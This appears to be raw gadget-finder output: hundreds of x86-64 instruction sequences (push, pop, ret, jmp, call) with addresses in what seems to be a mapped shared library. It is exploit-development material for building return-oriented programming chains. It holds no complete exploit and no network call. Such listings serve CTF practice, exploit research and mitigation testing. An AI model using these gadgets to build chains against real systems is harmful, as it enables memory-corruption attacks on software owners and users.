0x00002aaaaab80f5e : push rax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac69d74 : push rax ; pop rsi ; cld ; jmp rax
0x00002aaaaac69d90 : push rax ; push rcx ; cld ; call qword ptr [rax]
0x00002aaaaac5c3e3 : push rax ; push rcx ; jmp qword ptr [rax]
0x00002aaaaac5d977 : push rax ; push rdx ; hlt ; jmp rax
0x00002aaaaaaf8ad0 : push rax ; push rsp ; ret
0x00002aaaaac6a98f : push rax ; pushfq ; cld ; call qword ptr [rax + 0x10fffca4]
0x00002aaaaaae0b70 : push rax ; ret
0x00002aaaaab514dc : push rax ; ret 0x34
0x00002aaaaab94651 : push rax ; ror byte ptr [rax - 0x46], 1 ; ret
0x00002aaaaab975e4 : push rax ; ror byte ptr [rax - 0x7d], 1 ; ret
0x00002aaaaab51886 : push rax ; sbb byte ptr [rbx - 0x2fd6efb9], cl ; ret
0x00002aaaaab47bda : push rax ; sbb byte ptr [rcx + 0x5bc0310b], cl ; ret
0x00002aaaaabe44f2 : push rax ; sbb dh, dh ; ret 0x7508
0x00002aaaaac69283 : push rax ; sbb ebx, edi ; jmp rax
0x00002aaaaabe8e35 : push rax ; shr ax, 0xe ; and eax, 1 ; ret
0x00002aaaaabc9fa1 : push rax ; shr ecx, 3 ; rep stosq qword ptr [rdi], rax ; ret
0x00002aaaaac5c3b3 : push rax ; std ; int1 ; jmp qword ptr [rax]
0x00002aaaaac692f7 : push rax ; sti ; call rax
0x00002aaaaac692ec : push rax ; sti ; push qword ptr [rax] ; sti ; call qword ptr [rax]
0x00002aaaaac69ab4 : push rax ; sub ah, bh ; jmp qword ptr [rax]
0x00002aaaaac69a9c : push rax ; sub al, 0xfc ; inc dword ptr [rax + 0x2e] ; cld ; call qword ptr [rax]
0x00002aaaaab47bd6 : push rax ; sub byte ptr [rax - 0x77], cl ; push rax ; sbb byte ptr [rcx + 0x5bc0310b], cl ; ret
0x00002aaaaabd58bc : push rax ; sub dword ptr [rax + rax], ebp ; ret
0x00002aaaaac69a1c : push rax ; sub eax, 0x2f30fffc ; cld ; call qword ptr [rax]
0x00002aaaaac69997 : push rax ; sub edi, esp ; call rax
0x00002aaaaac6aa1c : push rax ; test bh, ah ; call rax
0x00002aaaaac6a9e0 : push rax ; test edi, esp ; call rax
0x00002aaaaac22214 : push rax ; vmovdqu xmmword ptr [rax + 0x60], xmm11 ; vmovdqu xmmword ptr [rax + 0x70], xmm12 ; ret
0x00002aaaaac6a260 : push rax ; xchg ah, bh ; jmp rax
0x00002aaaaac6aa44 : push rax ; xchg eax, ebx ; cld ; call rax
0x00002aaaaac6aa00 : push rax ; xchg eax, ecx ; cld ; call rax
0x00002aaaaac81e10 : push rax ; xchg eax, ecx ; hlt ; jmp qword ptr [rcx]
0x00002aaaaab8e43c : push rax ; xchg eax, esi ; idiv bh ; add rsp, 0x10 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaac6aa08 : push rax ; xchg eax, esp ; cld ; call rax
0x00002aaaaac6aa24 : push rax ; xchg esp, edi ; call rax
0x00002aaaaac69a8c : push rax ; xor al, 0xfc ; jmp rax
0x00002aaaaab50f75 : push rax ; xor byte ptr [rbx + 0x374fff8], al ; and dword ptr [rbx], 0xffffffef ; pop rbx ; ret
0x00002aaaaab50fcd : push rax ; xor byte ptr [rbx - 0x198a0008], al ; pop rbx ; ret
0x00002aaaaabb6860 : push rbp ; adc byte ptr [rax + 0x39], cl ; ret 0x2575
0x00002aaaaabb6885 : push rbp ; adc byte ptr [rax + 0x39], cl ; ret 0xe474
0x00002aaaaac46f87 : push rbp ; adc byte ptr [rcx - 0x75], cl ; sbb byte ptr [r8 - 0x7d], r9b ; ret
0x00002aaaaac0318c : push rbp ; adc byte ptr [rcx], bh ; ret
0x00002aaaaabca072 : push rbp ; add al, 0x48 ; add esp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaabc9ff4 : push rbp ; add al, 0x8d ; add dword ptr [r8 - 0x7d], ecx ; ret
0x00002aaaaac43f99 : push rbp ; add al, byte ptr [rax] ; movsxd rcx, dword ptr [r11 + rdx*4] ; add rcx, r11 ; jmp rcx
0x00002aaaaab1e50f : push rbp ; add byte ptr [rax + 1], cl ; ror byte ptr [rax + 0x39], 1 ; ret 0x8949
0x00002aaaaabc689d : push rbp ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaabd73a1 : push rbp ; add byte ptr [rcx + 0xf], al ; lahf ; ret
0x00002aaaaaba8a1c : push rbp ; add byte ptr [rcx], bh ; ret 0x840f
0x00002aaaaac69fb1 : push rbp ; cld ; call qword ptr [rax + 0x10fffc54]
0x00002aaaaac69fad : push rbp ; cld ; call qword ptr [rax]
0x00002aaaaac69e31 : push rbp ; cld ; call rdx
0x00002aaaaac69f71 : push rbp ; cld ; jmp qword ptr [rax + 0x20fffc54]
0x00002aaaaac69f6d : push rbp ; cld ; jmp qword ptr [rax]
0x00002aaaaac6f709 : push rbp ; cli ; ljmp ptr [rbx + rax*2 + 0x56240002] ; cli ; jmp rsp
0x00002aaaaabc20f8 : push rbp ; dec dword ptr [rax + 0x63] ; ret 0x8d48
0x00002aaaaac5d74d : push rbp ; hlt ; call qword ptr [rbx]
0x00002aaaaac5d755 : push rbp ; hlt ; jmp qword ptr [rdi]
0x00002aaaaac5d939 : push rbp ; hlt ; jmp qword ptr [rdx]
0x00002aaaaaad6cb9 : push rbp ; je 0x1ce7 ; ret
0x00002aaaaabb7427 : push rbp ; jno 0xe242f ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaac69510 : push rbp ; mov ch, 0xfd ; call rcx
0x00002aaaaac0c26c : push rbp ; mov rcx, qword ptr [rsp + 0x18] ; lea r9, qword ptr [rsp + 0x3a] ; call qword ptr [rax]
0x00002aaaaabe8785 : push rbp ; nop ; mov edx, dword ptr [rbx + 0x18] ; mov dword ptr [rbp - 0x80], edx ; mov rdx, r12 ; call rax
0x00002aaaaabe8c4b : push rbp ; nop ; mov edx, dword ptr [rbx + 0x60] ; mov dword ptr [rbp - 0x80], edx ; mov rdx, r13 ; call rax
0x00002aaaaabe8b14 : push rbp ; nop ; mov rdx, r13 ; call rax
0x00002aaaaac1df78 : push rbp ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaabe82b4 : push rbp ; or byte ptr [rax - 0x77], 0xda ; call rax
0x00002aaaaabab30b : push rbp ; or byte ptr [rcx - 0x75], cl ; je 0xd633d ; or byte ptr [rcx], ch ; ret
0x00002aaaaabcf2fa : push rbp ; push qword ptr [rcx] ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x00002aaaaac5d743 : push rbp ; push rsp ; hlt ; jmp qword ptr [rdx]
0x00002aaaaab6d9b8 : push rbp ; ret
0x00002aaaaab6ffc6 : push rbp ; ret 0x8348
0x00002aaaaab6d9aa : push rbp ; ret 0x8349
0x00002aaaaabd9e2a : push rbp ; rol byte ptr [rbx - 0x34d6fe3d], 1 ; ret
0x00002aaaaabe8722 : push rbp ; sbb byte ptr [rcx - 0x76b37fab], cl ; call rax
0x00002aaaaaad75de : push rbp ; sbb esi, dword ptr [rdx] ; sahf ; jl 0x257b ; loop 0x25c6 ; ret 0x23cb
0x00002aaaaabe5ab8 : push rbp ; sub byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab20ccf : push rbp ; sub dh, al ; add byte ptr [rcx - 0x7d], cl ; ret
0x00002aaaaaba9c3b : push rbp ; test al, 0x89 ; ret
0x00002aaaaaaf8657 : push rbp ; test al, 0xe8 ; ret 0xffff
0x00002aaaaabe8141 : push rbp ; test byte ptr [rbp + 0x390b74d2], al ; ret 0xf7e
0x00002aaaaab4bba2 : push rbp ; xor byte ptr [rax - 0x77], cl ; push rbx ; sbb byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaabe9de0 : push rbp ; xor eax, eax ; mov rbp, rsp ; pop rbp ; ret
0x00002aaaaab62f6a : push rbp ; xor rax, rax ; ret
0x00002aaaaab5d621 : push rbx ; adc byte ptr [rax - 0x77], cl ; push rbx ; sbb byte ptr [rax - 0x77], cl ; ret 0x348
0x00002aaaaaad54b5 : push rbx ; add al, 4 ; ret 0x6080
0x00002aaaaab8ac99 : push rbx ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00002aaaaaba1fc5 : push rbx ; add byte ptr [r15 - 0x48], sil ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaabda231 : push rbx ; add dword ptr [rax - 0x73], ecx ; add cl, byte ptr [r8 + 0x39] ; ret 0xf48
0x00002aaaaabaf657 : push rbx ; add dword ptr [rax - 0x7d], ecx ; ret
0x00002aaaaab5a3cf : push rbx ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; jmp qword ptr [rax]
0x00002aaaaac85335 : push rbx ; add dword ptr [rax], eax ; js 0x1b03b6 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaabe4e8c : push rbx ; and byte ptr [rax + 0x2b], cl ; xor r9b, bpl ; ret
0x00002aaaaac69fbd : push rbx ; cld ; call qword ptr [rax]
0x00002aaaaac69f7d : push rbx ; cld ; jmp qword ptr [rax]
0x00002aaaaac6f6e1 : push rbx ; cli ; call rsp
0x00002aaaaac5e2eb : push rbx ; cmc ; call qword ptr [rbx]
0x00002aaaaac84731 : push rbx ; cmc ; call qword ptr [rdx]
0x00002aaaaaad7053 : push rbx ; cmp byte ptr [rdi - 0x19ade7f3], dl ; ret
0x00002aaaaabb4806 : push rbx ; cmp cl, ch ; ret
0x00002aaaaabb4307 : push rbx ; cmp cl, ch ; ret 0xfffe
0x00002aaaaac5d4e4 : push rbx ; fcomi st(3) ; inc dword ptr [rcx - 0x25] ; call rcx
0x00002aaaaac5d685 : push rbx ; hlt ; call qword ptr [rbx]
0x00002aaaaac5d69d : push rbx ; hlt ; dec dword ptr [rdi + 0x53] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d699 : push rbx ; hlt ; inc dword ptr [rbp + 0x53] ; hlt ; dec dword ptr [rdi + 0x53] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d6e5 : push rbx ; hlt ; inc dword ptr [rdi] ; push rsp ; hlt ; call qword ptr [rcx]
0x00002aaaaac5d991 : push rbx ; hlt ; inc eax ; push rdx ; hlt ; inc eax ; push rdx ; hlt ; jmp rax
0x00002aaaaac5d68d : push rbx ; hlt ; jmp qword ptr [rdi]
0x00002aaaaac5d6a1 : push rbx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d985 : push rbx ; hlt ; jmp rax
0x00002aaaaac6e329 : push rbx ; idiv edi ; pop rsp ; mov bl, 1 ; add byte ptr [rbp + rdx*2 - 9], dh ; call rsp
0x00002aaaaaaff692 : push rbx ; je 0x2a6a9 ; cmp esi, 3 ; je 0x2a6a9 ; pop rbx ; ret
0x00002aaaaab0f6c3 : push rbx ; je 0x3a70b ; xor eax, eax ; cmp byte ptr [rdi], 0 ; jne 0x3a6db ; pop rbx ; ret
0x00002aaaaab47ad9 : push rbx ; je 0x72b3d ; pop rbp ; pop r12 ; ret
0x00002aaaaab47b7e : push rbx ; je 0x72be2 ; pop rbp ; pop r12 ; ret
0x00002aaaaaba201d : push rbx ; je 0xccffa ; mov eax, 1 ; ret
0x00002aaaaaba201c : push rbx ; je 0xccffb ; mov eax, 1 ; ret
0x00002aaaaab8099c : push rbx ; lea rax, qword ptr [rdi - 0x10] ; ret
0x00002aaaaab7cb82 : push rbx ; movq qword ptr [rdi + 0x30], mm7 ; lea rax, qword ptr [rdi + 0x40] ; ret
0x00002aaaaab7b372 : push rbx ; movq qword ptr [rdi + 0x30], mm7 ; ret
0x00002aaaaab7e402 : push rbx ; movq qword ptr [rdi + 0x30], mm7 ; xor ch, ch ; mov byte ptr [rdi + 0x40], ch ; ret
0x00002aaaaab41e2a : push rbx ; or al, 0xf6 ; ret 0xf04
0x00002aaaaab5042b : push rbx ; or byte ptr [rdi], cl ; mov dh, 0 ; pop rbx ; ret
0x00002aaaaaad8cdc : push rbx ; or byte ptr fs:[rbx + 0x4e], ch ; ret 0x6bba
0x00002aaaaabff4a5 : push rbx ; out dx, eax ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaabff44d : push rbx ; out dx, eax ; dec dword ptr [rax - 0x7b] ; sal byte ptr [rbx + 0x31], 0xc0 ; pop rbx ; ret
0x00002aaaaab028a8 : push rbx ; ret
0x00002aaaaab5d625 : push rbx ; sbb byte ptr [rax - 0x77], cl ; ret 0x348
0x00002aaaaab4bb03 : push rbx ; sbb byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab4bba6 : push rbx ; sbb byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaabd5e3a : push rbx ; sub al, 0 ; add rsp, 8 ; ret
0x00002aaaaab4f8a4 : push rbx ; sub cl, ch ; ret 0xfffe
0x00002aaaaab4d771 : push rbx ; sub rdx, rsi ; mov rdi, rbx ; call rax
0x00002aaaaac590dc : push rbx ; xchg eax, edx ; jae 0x1840bb ; push rsi ; pop rdx ; je 0x1840b0 ; ret 0xacfc
0x00002aaaaac06725 : push rcx ; adc byte ptr [rax + 1], bh ; ret
0x00002aaaaac4435d : push rcx ; add al, byte ptr [rax] ; movsxd rcx, dword ptr [r11 + rdx*4] ; add rcx, r11 ; jmp rcx
0x00002aaaaaba1f0a : push rcx ; add byte ptr [rax], al ; je 0xccf5f ; mov eax, 0x20 ; ret
0x00002aaaaab8bda6 : push rcx ; add dword ptr [rax + 0x39], ecx ; ret 0x2973
0x00002aaaaac8507d : push rcx ; add dword ptr [rax], eax ; and byte ptr [rdx - 0xb], dh ; jmp qword ptr [rcx]
0x00002aaaaac8510d : push rcx ; add dword ptr [rax], eax ; loopne 0x1b018a ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac850ad : push rcx ; add dword ptr [rax], eax ; push rax ; jb 0x1b00ae ; jmp qword ptr [rcx]
0x00002aaaaabab1be : push rcx ; add dword ptr [rbx - 0x7cb7fe3b], eax ; ret
0x00002aaaaab55203 : push rcx ; add dword ptr [rcx], edx ; add cl, ch ; ret 0xfffe
0x00002aaaaab73239 : push rcx ; add esi, eax ; add dword ptr [rax], eax ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaab732b8 : push rcx ; add esi, eax ; add dword ptr [rax], eax ; pop rbx ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaac02b2e : push rcx ; add rsp, 0x10 ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac0ef4e : push rcx ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaac58365 : push rcx ; call qword ptr [rsi]
0x00002aaaaac69d91 : push rcx ; cld ; call qword ptr [rax]
0x00002aaaaac69f8d : push rcx ; cld ; inc dword ptr [rax] ; push rcx ; cld ; jmp qword ptr [rax + 0x20fffc58]
0x00002aaaaac69fcd : push rcx ; cld ; inc dword ptr [rax] ; xor al, 0xfc ; jmp qword ptr [rax]
0x00002aaaaac69f91 : push rcx ; cld ; jmp qword ptr [rax + 0x20fffc58]
0x00002aaaaac69e11 : push rcx ; cld ; jmp rdx
0x00002aaaaac5d5c5 : push rcx ; hlt ; call qword ptr [rcx]
0x00002aaaaac5d609 : push rcx ; hlt ; call rdx
0x00002aaaaac5d929 : push rcx ; hlt ; dec dword ptr [rax + 0x54fff451] ; push rcx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d5d9 : push rcx ; hlt ; dec dword ptr [rdx + 0x51] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d605 : push rcx ; hlt ; dec eax ; push rcx ; hlt ; call rdx
0x00002aaaaac5d5cd : push rcx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d611 : push rcx ; hlt ; jmp rsi
0x00002aaaaac5d5c9 : push rcx ; hlt ; lcall ptr [rbx] ; push rcx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5c3dd : push rcx ; inc eax ; push rcx ; push rax ; push rcx ; jmp qword ptr [rax]
0x00002aaaaab7416d : push rcx ; jl 0x9f1be ; adc dword ptr [rcx - 1], edi ; ret
0x00002aaaaab742d4 : push rcx ; jl 0x9f325 ; adc dword ptr [rcx + 7], edi ; ret
0x00002aaaaab748c0 : push rcx ; jl 0x9f911 ; adc dword ptr [rcx - 1], edi ; ret
0x00002aaaaab74a27 : push rcx ; jl 0x9fa78 ; adc dword ptr [rcx + 7], edi ; ret
0x00002aaaaab7500d : push rcx ; jl 0xa005e ; adc dword ptr [rcx - 1], edi ; ret
0x00002aaaaab75174 : push rcx ; jl 0xa01c5 ; adc dword ptr [rcx + 7], edi ; ret
0x00002aaaaabe198b : push rcx ; jle 0x10c9bf ; add byte ptr [rax - 0x77], cl ; ret 0x9ce9
0x00002aaaaac5c3e5 : push rcx ; jmp qword ptr [rax]
0x00002aaaaaad6b2c : push rcx ; jns 0x1b39 ; ret
0x00002aaaaac6cbd9 : push rcx ; lcall ptr [rsp + rbp + 0x52140001] ; call rsp
0x00002aaaaac6951f : push rcx ; mov ch, 0xfd ; call rcx
0x00002aaaaac6953f : push rcx ; mov dh, 0xfd ; call rcx
0x00002aaaaaad866c : push rcx ; outsb dx, byte ptr [rsi] ; stosb byte ptr [rdi], al ; stc ; insb byte ptr [rdi], dx ; mov ebx, 0x952a6c41 ; ret
0x00002aaaaac5c3e1 : push rcx ; push rax ; push rcx ; jmp qword ptr [rax]
0x00002aaaaac8f12e : push rcx ; ret
0x00002aaaaabf01cf : push rcx ; ret 0x2a
0x00002aaaaab1231f : push rcx ; rol byte ptr [rax - 0x6df0f506], 1 ; ret 0xb60f
0x00002aaaaac6ef09 : push rcx ; stc ; push qword ptr [rdx + rcx + 0x52240002] ; stc ; call rsp
0x00002aaaaab7e232 : push rdi ; adc al, 0x30 ; in eax, dx ; mov byte ptr [rdi + 0x15], ch ; ret
0x00002aaaaab7c7c2 : push rdi ; adc al, 0x48 ; lea eax, dword ptr [rdi + 0x15] ; ret
0x00002aaaaab7e3b3 : push rdi ; adc byte ptr [rax - 0x12cfdfb1], cl ; mov byte ptr [rdi + 0x21], ch ; ret
0x00002aaaaab7e2b1 : push rdi ; adc byte ptr [rax - 0x12cfe7b1], cl ; mov byte ptr [rdi + 0x19], ch ; ret
0x00002aaaaab7e390 : push rdi ; adc byte ptr [rax], dh ; in eax, dx ; mov byte ptr [rdi + 0x20], ch ; ret
0x00002aaaaab7e311 : push rdi ; adc byte ptr [rcx - 0x12cfe7b1], cl ; mov byte ptr [rdi + 0x1c], ch ; ret
0x00002aaaaab7e2f1 : push rdi ; adc byte ptr [rcx - 0x12cfe8b1], cl ; mov byte ptr [rdi + 0x1b], ch ; ret
0x00002aaaaac428df : push rdi ; adc byte ptr [rsi + 0xf], ah ; out dx, eax ; push rsi ; adc byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaab7e2d2 : push rdi ; adc byte ptr [rsi - 0x77], ah ; sbb byte ptr [r8], r14b ; in eax, dx ; mov byte ptr [rdi + 0x1a], ch ; ret
0x00002aaaaab7e068 : push rdi ; add al, 0x30 ; in eax, dx ; mov byte ptr [rdi + 5], ch ; ret
0x00002aaaaab7e07a : push rdi ; add al, 0x30 ; in eax, dx ; mov byte ptr [rdi + 6], ch ; ret
0x00002aaaaab72ef4 : push rdi ; add al, 0x48 ; lea eax, dword ptr [rdi + 5] ; ret
0x00002aaaaab72f04 : push rdi ; add al, 0x48 ; lea eax, dword ptr [rdi + 6] ; mov byte ptr [rdi + 6], 0 ; ret
0x00002aaaaab7c60a : push rdi ; add al, 0x48 ; lea eax, dword ptr [rdi + 6] ; ret
0x00002aaaaac2f8b9 : push rdi ; add al, 0x48 ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaab72e64 : push rdi ; add al, 0x48 ; mov eax, edi ; mov byte ptr [rdi + 6], 0 ; ret
0x00002aaaaab72df4 : push rdi ; add al, 0x48 ; mov eax, edi ; ret
0x00002aaaaab02a7c : push rdi ; add al, 0x72 ; or bl, dh ; ret
0x00002aaaaab7ae7a : push rdi ; add al, bl ; nop dword ptr [rax] ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x00002aaaaac6fa5d : push rdi ; add al, byte ptr [rax] ; and al, 0xc3 ; cli ; jmp rsp
0x00002aaaaac6fa65 : push rdi ; add al, byte ptr [rax] ; push rsp ; ret
0x00002aaaaab7e03a : push rdi ; add dh, byte ptr [rax] ; in eax, dx ; mov byte ptr [rdi + 3], ch ; ret
0x00002aaaaaba5a18 : push rdi ; add dword ptr [rax - 0x7d], ecx ; mov dword ptr [rcx], 0xdf75d284 ; ret
0x00002aaaaab7b88c : push rdi ; add eax, 0xc478d48 ; ret
0x00002aaaaab7c6cc : push rdi ; add eax, 0xd478d48 ; ret
0x00002aaaaabd2e5a : push rdi ; add ebx, ebp ; and eax, 0x83489066 ; ret 0x3c01
0x00002aaaaab7e098 : push rdi ; add esi, dword ptr [rax] ; in eax, dx ; mov byte ptr [rdi + 7], ch ; ret
0x00002aaaaabdceaa : push rdi ; and byte ptr [rax - 0x73], cl ; adc byte ptr [rax + 0x39], r9b ; ret 0x1b72
0x00002aaaaac428f4 : push rdi ; and byte ptr [rsi + 0xf], ah ; out dx, eax ; push rsi ; and byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaac8e5a9 : push rdi ; call qword ptr [rdx]
0x00002aaaaac26d08 : push rdi ; clc ; ret
0x00002aaaaaad88eb : push rdi ; clc ; salc ; jb 0x3971 ; cmpsq qword ptr [rsi], qword ptr [rdi] ; ret 0x49ec
0x00002aaaaac69fa1 : push rdi ; cld ; call qword ptr [rax + 0x10fffc56]
0x00002aaaaac69f9d : push rdi ; cld ; call qword ptr [rax]
0x00002aaaaac69e21 : push rdi ; cld ; call rdx
0x00002aaaaac69f61 : push rdi ; cld ; jmp qword ptr [rax + 0x20fffc56]
0x00002aaaaac69f5d : push rdi ; cld ; jmp qword ptr [rax]
0x00002aaaaac26e80 : push rdi ; cld ; ret
0x00002aaaaac6f749 : push rdi ; cli ; dec esp ; add r8b, byte ptr [rax] ; hlt ; push rdi ; cli ; jmp rsp
0x00002aaaaac6f751 : push rdi ; cli ; jmp rsp
0x00002aaaaac279a7 : push rdi ; cli ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac2f199 : push rdi ; cmc ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac09ce5 : push rdi ; cmp byte ptr [rax + 1], bh ; ret
0x00002aaaaab5cb2a : push rdi ; fmul dword ptr [rax + 0x39] ; ret 0x2f74
0x00002aaaaac2f119 : push rdi ; hlt ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac05245 : push rdi ; imul dh ; dec dword ptr [rax - 0x77] ; ret 0x8948
0x00002aaaaac5acbb : push rdi ; in eax, dx ; call rdx
0x00002aaaaac2ef6a : push rdi ; int1 ; mov qword ptr [rdi - 8], rcx ; ret
0x00002aaaaab50130 : push rdi ; mov qword ptr [rdi + 0x18], rax ; mov qword ptr [rdi + 8], rax ; ret
0x00002aaaaab50164 : push rdi ; mov qword ptr [rdi + 8], rax ; ret
0x00002aaaaac2effa : push rdi ; mov qword ptr [rdi - 8], rcx ; ret
0x00002aaaaabf7460 : push rdi ; or al, 0x48 ; mov dword ptr [rsi], edi ; ret
0x00002aaaaab7e0dc : push rdi ; or byte ptr [rax], dh ; in eax, dx ; mov byte ptr [rdi + 0xa], ch ; ret
0x00002aaaaab7e11a : push rdi ; or byte ptr [rax], dh ; in eax, dx ; mov byte ptr [rdi + 0xc], ch ; ret
0x00002aaaaab7e0ba : push rdi ; or byte ptr [rax], dh ; in eax, dx ; mov byte ptr [rdi + 9], ch ; ret
0x00002aaaaab8f671 : push rdi ; or byte ptr [rbp - 0x28], dh ; ret
0x00002aaaaab1f00a : push rdi ; or byte ptr [rcx + 0x29], cl ; ret 0x894c
0x00002aaaaab1d42a : push rdi ; or byte ptr [rcx + 1], cl ; ret 0x894c
0x00002aaaaac12ef2 : push rdi ; or byte ptr [rcx + rcx*4 + 0x24], cl ; ret 0x8b41
0x00002aaaaab1d431 : push rdi ; or byte ptr [rcx - 0x2feeb728], cl ; pop rbp ; pop rbx ; ret
0x00002aaaaab4cf60 : push rdi ; or byte ptr [rdi], cl ; mov dh, 0 ; ret
0x00002aaaaab7ba70 : push rdi ; or eax, 0x1c478d48 ; ret
0x00002aaaaab7c8c0 : push rdi ; or eax, 0x1d478d48 ; ret
0x00002aaaaac43bfe : push rdi ; ret
0x00002aaaaab71935 : push rdi ; ret 0xf800
0x00002aaaaac43c9e : push rdi ; ret 0xff3
0x00002aaaaabc8595 : push rdi ; ret 0xfff2
0x00002aaaaabe6380 : push rdi ; rol dword ptr [rdi], cl ; add byte ptr [rax - 0x77], cl ; ret 0x894c
0x00002aaaaac102c3 : push rdi ; sbb byte ptr [rax + 1], bh ; ret
0x00002aaaaabe3986 : push rdi ; sbb byte ptr [rax - 0x77], cl ; ret
0x00002aaaaac113db : push rdi ; sbb byte ptr [rcx + 0x63], cl ; ret
0x00002aaaaac27ba7 : push rdi ; stc ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac273ca : push rdi ; std ; mov word ptr [rdi - 2], cx ; ret
0x00002aaaaac277a7 : push rdi ; sti ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac09d2d : push rdi ; sub byte ptr [rax + 1], bh ; ret
0x00002aaaaabd903c : push rdi ; sub dh, al ; add byte ptr [rdx], cl ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab4900f : push rdi ; sub rdx, rsi ; mov rdi, r15 ; call rax
0x00002aaaaab7e370 : push rdi ; wrmsr ; in eax, dx ; mov byte ptr [rdi + 0x1f], ch ; ret
0x00002aaaaac42909 : push rdi ; xor byte ptr [rsi + 0xf], ah ; out dx, eax ; push rsi ; xor byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaab6197b : push rdi ; xor byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret
0x00002aaaaac442c6 : push rdx ; add al, byte ptr [rax] ; movsxd rcx, dword ptr [r11 + rdx*4] ; add rcx, r11 ; jmp rcx
0x00002aaaaac6d185 : push rdx ; add dword ptr [rax], eax ; add al, 8 ; hlt ; call rsp
0x00002aaaaabd41fc : push rdx ; add dword ptr [rax], eax ; add rsp, 0x80 ; ret
0x00002aaaaac851b5 : push rdx ; add dword ptr [rax], eax ; fdiv dword ptr [rbx - 0xb] ; jmp qword ptr [rcx]
0x00002aaaaac85185 : push rdx ; add dword ptr [rax], eax ; js 0x1b0203 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac85184 : push rdx ; add dword ptr [rax], eax ; js 0x1b0204 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac85155 : push rdx ; add dword ptr [rax], eax ; sub byte ptr [rbx - 0xb], dh ; call qword ptr [rsi]
0x00002aaaaabf830e : push rdx ; add dword ptr [rcx - 0x7d], ecx ; ret 0x4102
0x00002aaaaac6cbe1 : push rdx ; call rsp
0x00002aaaaac69dc9 : push rdx ; cld ; call rax
0x00002aaaaac69e09 : push rdx ; cld ; ljmp ptr [rcx + rdx*2 + 0x513cfffc] ; cld ; jmp rdx
0x00002aaaaac6f6d9 : push rdx ; cli ; lcall ptr [rdx + rax*2 + 0x53440002] ; cli ; call rsp
0x00002aaaaac0224d : push rdx ; cmp byte ptr [rax - 0x7b], cl ; sal byte ptr [rbp + rax + 0x48], cl ; mov edi, ebp ; call rdx
0x00002aaaaac5d96d : push rdx ; hlt ; call qword ptr [rax - 0x1f000bae]
0x00002aaaaac5d681 : push rdx ; hlt ; dec dword ptr [rcx] ; push rbx ; hlt ; call qword ptr [rbx]
0x00002aaaaac5d625 : push rdx ; hlt ; dec dword ptr [rsi] ; push rdx ; hlt ; lcall ptr [rax] ; push rdx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d785 : push rdx ; hlt ; inc dword ptr [rax + 0x52] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d995 : push rdx ; hlt ; inc eax ; push rdx ; hlt ; jmp rax
0x00002aaaaac5d99d : push rdx ; hlt ; jmp qword ptr [rax + 0x26fff452]
0x00002aaaaac5d62d : push rdx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d9a1 : push rdx ; hlt ; jmp qword ptr [rsi]
0x00002aaaaac5d971 : push rdx ; hlt ; jmp rax
0x00002aaaaac5d629 : push rdx ; hlt ; lcall ptr [rax] ; push rdx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d7dd : push rdx ; hlt ; ljmp ptr [rdi] ; push rsp ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d631 : push rdx ; hlt ; ljmp ptr [rdx + rdx*2] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d981 : push rdx ; hlt ; push qword ptr [rax - 0x1f000bad] ; push rdx ; hlt ; jmp rax
0x00002aaaaac5d781 : push rdx ; hlt ; push qword ptr [rsi] ; push rdx ; hlt ; inc dword ptr [rax + 0x52] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d975 : push rdx ; hlt ; push rax ; push rdx ; hlt ; jmp rax
0x00002aaaaac78099 : push rdx ; in eax, dx ; jmp qword ptr [rsi]
0x00002aaaaabd39ca : push rdx ; jbe 0xfea01 ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
